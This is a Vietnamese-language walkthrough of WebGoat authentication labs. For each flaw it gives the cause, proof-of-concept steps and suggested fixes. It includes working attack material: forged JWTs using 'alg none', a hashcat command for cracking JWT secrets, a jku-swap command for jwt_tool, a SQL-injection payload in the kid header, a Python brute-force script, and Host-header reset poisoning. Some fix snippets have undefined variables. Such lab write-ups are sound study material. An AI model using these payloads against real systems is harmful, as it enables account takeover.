# (A7) Identity & Auth Failure

# **Authentication Bypasses**

### Nguyên nhân lỗi

- Lập trình viên mắc phải lỗi trong việc xây dựng logic kiểm tra câu hỏi bảo mật

```java
public boolean verifyAccount(Integer userId, HashMap<String, String> submittedQuestions) {
    // short circuit if no questions are submitted
    if (submittedQuestions.entrySet().size() != secQuestionStore.get(verifyUserId).size()) {
      return false;
    }

    if (submittedQuestions.containsKey("secQuestion0")
        && !submittedQuestions
            .get("secQuestion0")
            .equals(secQuestionStore.get(verifyUserId).get("secQuestion0"))) {
      return false;
    }

    if (submittedQuestions.containsKey("secQuestion1")
        && !submittedQuestions
            .get("secQuestion1")
            .equals(secQuestionStore.get(verifyUserId).get("secQuestion1"))) {
      return false;
    }

    // else
    return true;
  }
```

- Ở đây, lập trình viên chỉ kiểm tra khi mà trong danh sách các câu hỏi có `secQuestion0` và `secQuestion1` , có nghĩa nếu không có 2 câu hỏi trên thì giá trị  trả về của hàm `verifyAccount` luôn là `True`

### POC

- Bắt một request và gửi nó đến Repeater

![image.png]((A7)%20Identity%20&%20Auth%20Failure%20ecda853d23ed41a8bd81e356f36b18e3/image.png)

- Thay đổi `secQuestion0` thành `secQuestion2` và `secQuestion1` thành `secQuestion3`  rồi gửi request

![image.png]((A7)%20Identity%20&%20Auth%20Failure%20ecda853d23ed41a8bd81e356f36b18e3/image%201.png)

### Cách khắc phục

- Thay đổi logic kiểm tra

```java
public boolean verifyAccount(Integer userId, HashMap<String, String> submittedQuestions) {
    // short circuit if no questions are submitted
    bool check = false;
    if (submittedQuestions.entrySet().size() != secQuestionStore.get(verifyUserId).size()) {
      return false;
    }

    if ((submittedAnswers.containsKey("secQuestion0")
            && submittedAnswers
                .get("secQuestion0")
                .equals(secQuestionStore.get(verifyUserId).get("secQuestion0")))
        && (submittedAnswers.containsKey("secQuestion1")
            && submittedAnswers
                .get("secQuestion1")
                .equals(secQuestionStore.get(verifyUserId).get("secQuestion1")))) {
      check = true;
    }

    return check;
  }
```

# Insecure Login

- Khi nhấn vào nút `Log in`  và bắt lại request thì nhận được một credential như sau

![image.png]((A7)%20Identity%20&%20Auth%20Failure%20ecda853d23ed41a8bd81e356f36b18e3/image%202.png)

```json
{"username":"CaptainJack","password":"BlackPearl"}
```

- Dùng thông tin này để đăng nhập vào để bypass

# JWT tokens

## Lab 4

- Sử dụng tính năng JWT trong WebWolf để decode token này và thu được username là: `user`

![image.png]((A7)%20Identity%20&%20Auth%20Failure%20ecda853d23ed41a8bd81e356f36b18e3/image%203.png)

## Lab 6

### Nguyên nhân lỗi

- Lập trình viên không kiểm tra tính toàn vẹn của token khi nhận được từ phía client, mà chỉ giải mã sau đó lấy phần body để xử lý tiếp các logic khác.

```java
Jwt jwt = Jwts.parser().setSigningKey(JWT_PASSWORD).parse(accessToken);
Claims claims = (Claims) jwt.getBody();
String user = (String) claims.get("user");
if ("Guest".equals(user) || !validUsers.contains(user)) {
  value.setSerializationView(Views.GuestView.class);
} else {
  value.setSerializationView(Views.UserView.class);
}
```

- Điều này khiến cho token có thể bị thay đổi và dữ liệu có thể thay đổi, khiến cho hacker có thể dễ dàng chiếm quyền và thay đổi thông tin để thực hiện các biện pháp tấn công khác.

### POC

- Đổi sang một người dùng khác thì sẽ nhận được một access_token, parse nó vào JWT của WebWolf

![image.png]((A7)%20Identity%20&%20Auth%20Failure%20ecda853d23ed41a8bd81e356f36b18e3/image%204.png)

![image.png]((A7)%20Identity%20&%20Auth%20Failure%20ecda853d23ed41a8bd81e356f36b18e3/image%205.png)

- Thay đổi `alg` thành `none` và `admin` thành `true` . Sau đó copy mã token mới được tạo lại

![image.png]((A7)%20Identity%20&%20Auth%20Failure%20ecda853d23ed41a8bd81e356f36b18e3/image%206.png)

- `eyJhbGciOiJub25lIn0.ew0KICAiYWRtaW4iIDogInRydWUiLA0KICAiaWF0IiA6IDE3MjQ0MDUyMjMsDQogICJ1c2VyIiA6ICJUb20iDQp9.`
- Thay mã token này vào, rồi thực hiện request đến `/votings`

![image.png]((A7)%20Identity%20&%20Auth%20Failure%20ecda853d23ed41a8bd81e356f36b18e3/image%207.png)

### Cách khắc phục

- Xác thực lại tính toàn vẹn của token

```java
try {
    Jwt<Claims> jwt = Jwts.parserBuilder()
        .setSigningKey(JWT_PASSWORD)
        .build()
        .parseClaimsJws(accessToken);
    
    Claims claims = jwt.getBody();
    String user = claims.get("user", String.class);

    if ("Guest".equals(user) || !validUsers.contains(user)) {
        value.setSerializationView(Views.GuestView.class);
    } else {
        value.setSerializationView(Views.UserView.class);
    }
} catch (JwtException e) {
    logger.error("JWT parsing error: ", e);
    value.setSerializationView(Views.GuestView.class);
}

```

## Lab 11

- Sử dụng tool `hashcat` để crack token này

```bash
hashcat token -m 16500 -a 3 -w 3 /usr/share/wordlist/rockyou.txt
```

![image.png]((A7)%20Identity%20&%20Auth%20Failure%20ecda853d23ed41a8bd81e356f36b18e3/image%208.png)

→ Tìm được key là `washington`

- Đưa token gốc vào JWT của WebGoat, sau đó dán key vào để lấy được token mới.
- Send token này và bypass lab này.

## Lab 13

> Để bypass được bài này có thể sử dụng cách như Lab 6 để chỉnh sửa token được ghi lại trong log.
> 

### Nguyên nhân lỗi

- Không kiểm tra `refreshToken` có phải là refreshToken của người dùng cần thực hiện hành vi làm mới token không. Điều này khiến cho hacker có thể sử dụng một `refreshToken` hợp lệ nhưng của một người dùng khác để thực hiện việc cấp lại `access_token` của tài khoản target.

```java
try {
  Jwt<Header, Claims> jwt =
      Jwts.parser().setSigningKey(JWT_PASSWORD).parse(token.replace("Bearer ", ""));
  user = (String) jwt.getBody().get("user");
  refreshToken = (String) json.get("refresh_token");
} catch (ExpiredJwtException e) {
  user = (String) e.getClaims().get("user");
  refreshToken = (String) json.get("refresh_token");
}

if (user == null || refreshToken == null) {
  return ResponseEntity.status(HttpStatus.UNAUTHORIZED).build();
} else if (validRefreshTokens.contains(refreshToken)) {
  validRefreshTokens.remove(refreshToken);
  return ok(createNewTokens(user));
} else {
  return ResponseEntity.status(HttpStatus.UNAUTHORIZED).build();
}
```

### POC

- Khi đăng nhập thì `access_token` và `refresh_token` sẽ được khởi tạo cho người dùng bằng hàm `createNewTokens` .

![image.png]((A7)%20Identity%20&%20Auth%20Failure%20ecda853d23ed41a8bd81e356f36b18e3/image%209.png)

- Trong hàm này refreshToken khi được khởi tạo sẽ được lưu vào mảng `*validRefreshTokens` .* Mảng này sẽ được sử dụng để kiểm tra `refreshToken` có hợp lệ không khi thực hiện việc làm mới - cấp lại `access_token` .

![image.png]((A7)%20Identity%20&%20Auth%20Failure%20ecda853d23ed41a8bd81e356f36b18e3/image%2010.png)

- Lúc này, chỉ cần đăng nhập bằng tài khoản `Jerry` để lấy được `refreshToken` và để lưu nó và trong mảng `validRefrshTokens` → phục vụ cho việc attack cấp lại `accessToken` cho người dùng `Tom`.

![image.png]((A7)%20Identity%20&%20Auth%20Failure%20ecda853d23ed41a8bd81e356f36b18e3/image%2011.png)

- Thực hiện request đến `/newToken` cùng với `refresh_token` trên, cùng với token trên header Authorization đã được thay đổi để user thành `Tom` để lấy được `access_token`mới của tài khoản `Tom` .

![Ở đây, logic code lại mắc phải lỗi đơn giản chỉ lấy data từ phần body của json web token mà không kiểm tra tính hợp lệ của token này → Điều này khiến cho việc giả mạo token để thay đổi trường data user vẫn có thể xảy ra (Tương tự như Lab 6)]((A7)%20Identity%20&%20Auth%20Failure%20ecda853d23ed41a8bd81e356f36b18e3/image%2012.png)

Ở đây, logic code lại mắc phải lỗi đơn giản chỉ lấy data từ phần body của json web token mà không kiểm tra tính hợp lệ của token này → Điều này khiến cho việc giả mạo token để thay đổi trường data user vẫn có thể xảy ra (Tương tự như Lab 6)

![Thay đổi user thành `Tom`]((A7)%20Identity%20&%20Auth%20Failure%20ecda853d23ed41a8bd81e356f36b18e3/image%2013.png)

Thay đổi user thành `Tom`

![Thực hiện việc tạo mới `access_token` của user `Tom` ]((A7)%20Identity%20&%20Auth%20Failure%20ecda853d23ed41a8bd81e356f36b18e3/image%2014.png)

Thực hiện việc tạo mới `access_token` của user `Tom` 

- Lấy `access_token` mới này thay thế cho token của `Jerry` ở phần header `Authorization` và thực hiện gửi request.

![image.png]((A7)%20Identity%20&%20Auth%20Failure%20ecda853d23ed41a8bd81e356f36b18e3/image%2015.png)

### Cách khắc phục

- Kiểm tra `refresh_token` có hợp lệ hay không, có phải token thuộc về người dùng thực hiện việc yêu cầu cấp `access_token` mới
    - Ở trong đoạn code này, có thể thay đổi `*validRefreshTokens`* thành kiểu HashMap.
    - Thực hiện việc xác định tính hợp lệ của `access_token`ở đoạn code này
    
    ![image.png]((A7)%20Identity%20&%20Auth%20Failure%20ecda853d23ed41a8bd81e356f36b18e3/image%2016.png)
    

## Lab 16

### Nguyên nhân lỗi

- Việc trích xuất URL `jku` từ header của token và sử dụng nó để tạo `JwkProvider` là rất nguy hiểm. Điều này cho phép kẻ tấn công đưa URL độc hại vào `jku`, từ đó có thể thực hiện các tấn công thay đổi jku để có thể xác thực mã token

### POC

- Gửi một request thực hiện việc xóa user Tom và bắt request này lại

![image.png]((A7)%20Identity%20&%20Auth%20Failure%20ecda853d23ed41a8bd81e356f36b18e3/image%2017.png)

- Ở đây đường dẫn bị sai, chỉnh `final` thành `jku` .
- Có thể thấy được có một mã token được gửi kèm trong request
- Dùng JWT của WebWolf để phân tích token này

![image.png]((A7)%20Identity%20&%20Auth%20Failure%20ecda853d23ed41a8bd81e356f36b18e3/image%2018.png)

- Ở đây chúng ta sẽ đổi `jku` thành một địa chỉ mà chúng ta host file `jwks.json` (Dùng WebWolf để host file này), `username` đổi thành Tom và chỉnh `exp` thành một ngày hợp lệ.

![image.png]((A7)%20Identity%20&%20Auth%20Failure%20ecda853d23ed41a8bd81e356f36b18e3/image%2019.png)

- Sử dụng một tool để tạo token mới dựa vào jku mới - https://github.com/ticarpi/jwt_tool

```bash
python jwt_tool.py eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHBzOi8vY29nbml0by1pZHAudXMtZWFzdC0xLmFtYXpvbmF3cy5jb20vd2ViZ29hdC8ud2VsbC1rbm93bi9qd2tzLmpzb24iLCJ0eXAiOiJKV1QifQ.ew0KICAiRW1haWwiIDogImplcnJ5QHdlYmdvYXQuY29tIiwNCiAgIlJvbGUiIDogWyAiQ2F0IiBdLA0KICAiYXVkIiA6ICJ3ZWJnb2F0Lm9yZyIsDQogICJleHAiIDogMTgxODkwNTMwNCwNCiAgImlhdCIgOiAxNTI0MjEwOTA0LA0KICAiaXNzIiA6ICJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLA0KICAic3ViIiA6ICJqZXJyeUB3ZWJnb2F0LmNvbSIsDQogICJ1c2VybmFtZSIgOiAiVG9tIg0KfQ. -X s
 -ju http://127.0.0.1:9090/WebWolf/files/shr3wd/jwks.json
```

![image.png]((A7)%20Identity%20&%20Auth%20Failure%20ecda853d23ed41a8bd81e356f36b18e3/image%2020.png)

- Sau khi chạy có một file jwks.json cũng được tạo ra, upload nó lên WebWolf để host.
- Copy token vừa được gen và thay vào rồi gửi request

![image.png]((A7)%20Identity%20&%20Auth%20Failure%20ecda853d23ed41a8bd81e356f36b18e3/image%2021.png)

### Cách khắc phục

- Kiểm tra JKU có nằm trong whitelist được cho phép hay không thì mới thực hiện việc kiểm tra

## Lab 18

### Nguyên nhân lỗi

- KID được lấy từ token được chèn thẳng vào trong câu lệnh SQL, điều này khiến cho việc kẻ tấn công có thể chèn payload để thực hiện SQL Injection
- Kết hợp lỗi SQL Injection có thể giả mạo một KID hợp lệ - mặc dù key không tồn tại trong database

![image.png]((A7)%20Identity%20&%20Auth%20Failure%20ecda853d23ed41a8bd81e356f36b18e3/image%2022.png)

### POC

- Thực hiện bắt một request delete tài khoản Tom, nó sẽ có một Token được gửi kèm như Lab 16.
- Sử dụng JWT trong WebGoat để phân tích Token này.
- Đổi trường `username` thành `Tom`, `exp` thành một giá trị hợp lệ (Lớn hơn ngày hiện tại)
- Đổi giá trị của trường kid thành payload để thực hiện SQL Injection giả mạo một key hợp lệ (Key ở đây sẽ chọn ngẫu nhiên - ở đây sẽ là `key` và key này sẽ được mã hóa base64 như logic của đoạn code)

```bash
qwert' UNION SELECT 'a2V5' FROM INFORMATION_SCHEMA.SYSTEM_TABLES; —
```

- Sau đó điền vào secret giá trị là key mà mình chọn - `key`

![image.png]((A7)%20Identity%20&%20Auth%20Failure%20ecda853d23ed41a8bd81e356f36b18e3/image%2023.png)

- Thay token mới này và thực hiện request và bypass được.

![image.png]((A7)%20Identity%20&%20Auth%20Failure%20ecda853d23ed41a8bd81e356f36b18e3/image%2024.png)

### Cách khắc phục

- Sử dụng Prepared Statements để thay thế cho việc truyền tham số vào trực tiếp như trên để phòng chống SQL Injection

```java
public byte[] resolveSigningKeyBytes(JwsHeader header, Claims claims) {
    final String kid = (String) header.get("kid");
    String query = "SELECT key FROM jwt_keys WHERE id = ?";
    
    try (var connection = dataSource.getConnection();
         PreparedStatement preparedStatement = connection.prepareStatement(query)) {
        
        preparedStatement.setString(1, kid);
        try (ResultSet rs = preparedStatement.executeQuery()) {
            if (rs.next()) {
                return TextCodec.BASE64.decode(rs.getString("key"));
            }
        }
    } catch (SQLException e) {
        errorMessage[0] = e.getMessage();
    }
    
    return null;
}

```

# Password Reset

## Lab 4

### Nguyên nhân lỗi

- Câu hỏi bảo mật quá dễ đoán, có thể bruteforce để tìm được.

### POC

- Để bruteforce nhanh hơn, code một đoạn code python như bên dưới.

```python
import requests

colors = ["red", "blue", "green", "yellow", "orange", "purple", 
"pink", "brown", "black", "white", "gray", "cyan", "magenta", "lime", "teal", 
"lavender", "maroon", "navy", "olive", "coral", "turquoise", "violet", "gold", "silver", 
"beige", "tan", "peach", "mint", "indigo", "aqua"]

account = ['tom', 'admin', 'larry']

headers = {  
    'Cookie': 'JSESSIONID=0FuKaJFAXbU6Yrw7EPUG24t4MySLL7BSwNIuQ18_'
}  

URL = "http://localhost:8080/WebGoat/PasswordReset/questions"

for acc in account:
    # username=fqw&securityQuestion=fqw
    for color in colors:
        data = {
            "username": acc,
            "securityQuestion": color
        }
        response = requests.post(URL, data=data, headers=headers)
        json = response.json()
        if "Sorry the solution is not correct" not in json["feedback"]:
            print(f"[+] Username: {acc}")
            print(f"[=>] Security Question: {color}")
            break
```

- Chạy payload và thu được các câu hỏi bảo mật đúng của từng tài khoản người dùng

![image.png]((A7)%20Identity%20&%20Auth%20Failure%20ecda853d23ed41a8bd81e356f36b18e3/image%2025.png)

### Cách khắc phục

- Để các câu hỏi bảo mật khó đoán và không có một danh sách trả lời cố định.
    - Ví dụ:
    - **Tên của con vật nuôi đầu tiên của bạn là gì?**
    - **Tên trường tiểu học mà bạn đã học là gì?**
    - **Tên của người bạn thân nhất thời thơ ấu của bạn là gì?**
    - **Tên thành phố nơi bạn sinh ra là gì?**
    - **Tên trường trung học mà bạn đã tốt nghiệp là gì?**

## Lab 6

### Nguyên nhân lỗi

- Không kiểm tra kỹ hết các header được sử dụng cho việc tạo link reset mật khẩu → Điều này khiến cho hacker có thể thao túng đường dẫn reset password và tạo ra một url giả để chiếm được đường dẫn reset password của người dùng.

```java
	public AttackResult sendPasswordResetLink(
	  @RequestParam String email, HttpServletRequest request) {
	String resetLink = UUID.randomUUID().toString();
	ResetLinkAssignment.resetLinks.add(resetLink);
	String host = request.getHeader(HttpHeaders.HOST);
	if (ResetLinkAssignment.TOM_EMAIL.equals(email)
	    && (host.contains(webWolfPort)
	        && host.contains(webWolfHost))) { // User indeed changed the host header.
	  ResetLinkAssignment.userToTomResetLink.put(getWebSession().getUserName(), resetLink);
	  fakeClickingLinkEmail(webWolfURL, resetLink);
	} else {
	  try {
	    sendMailToUser(email, host, resetLink);
	  } catch (Exception e) {
	    return failed(this).output("E-mail can't be send. please try again.").build();
	  }
	}
	
	return success(this).feedback("email.send").feedbackArgs(email).build();
	}
```

- Cụ thể ở đây là header HOST không được dùng để kiểm tra phần ip lẫn phần port. Điều này khiến việc tấn công có thể xảy ra bằng cách thay đổi đường dẫn được gửi đến người dùng. Khi người dùng nhấn vào đường dẫn Reset trong mail thì hacker có thể cướp được mã reset password này.

### POC

- Gửi một request để yêu cầu reset password, dùng burp suite để bắt lại request này.
- Thay đổi header `HOST`  thành host của WebWolf, thay đổi email thành email của nạn nhân (Ở đây là tom - [tom@webgoat-cloud.org](mailto:tom@webgoat-cloud.org)).
- Gửi Request và đợi Tom nhấn vào đường dẫn đổi mật khẩu.

![image.png]((A7)%20Identity%20&%20Auth%20Failure%20ecda853d23ed41a8bd81e356f36b18e3/image%2026.png)

- Vào phần `/requests` của WebWolf và thấy một request reset mật khẩu

![image.png]((A7)%20Identity%20&%20Auth%20Failure%20ecda853d23ed41a8bd81e356f36b18e3/image%2027.png)

- Dùng đường dẫn này, đổi port lại thành 8080 để truy cập vào trang đổi mật khẩu thật. Thay đổi mật khẩu và mật khẩu của tài khoản Tom sẽ bị thay đổi.

![image.png]((A7)%20Identity%20&%20Auth%20Failure%20ecda853d23ed41a8bd81e356f36b18e3/image%2028.png)

### Cách khắc phục

- **Kiểm tra và xác thực tiêu đề `Host`:** Đảm bảo rằng tiêu đề `Host` được xác thực và chỉ chấp nhận từ các nguồn đáng tin cậy.

```java
public AttackResult sendPasswordResetLink(
      @RequestParam String email, HttpServletRequest request) {
    String resetLink = UUID.randomUUID().toString();
    ResetLinkAssignment.resetLinks.add(resetLink);
    String host = request.getHeader(HttpHeaders.HOST);
    String expectedHost = "yourtrustedhost.com";
    if (ResetLinkAssignment.TOM_EMAIL.equals(email)
        && (host.contains(webWolfPort)
            && host.contains(webWolfHost))) { // User indeed changed the host header.
      ResetLinkAssignment.userToTomResetLink.put(getWebSession().getUserName(), resetLink);
      fakeClickingLinkEmail(webWolfURL, resetLink);
    } else {
      try {
        if (hostHeader == null || !hostHeader.equalsIgnoreCase(expectedHost)) {
		      return failed(this).output("Invalid host header.").build();  
        } else {
	        sendMailToUser(email, host, resetLink);
	      }
      } catch (Exception e) {
        return failed(this).output("E-mail can't be send. please try again.").build();
      }
    }

    return success(this).feedback("email.send").feedbackArgs(email).build();
  }
```

# Secure Password

- Nhập một mật khẩu có chứ ký tự viết hoa, chữ thường, ký tự số và ký tự đặc biệt
- Vi dụ: Test99482@1231!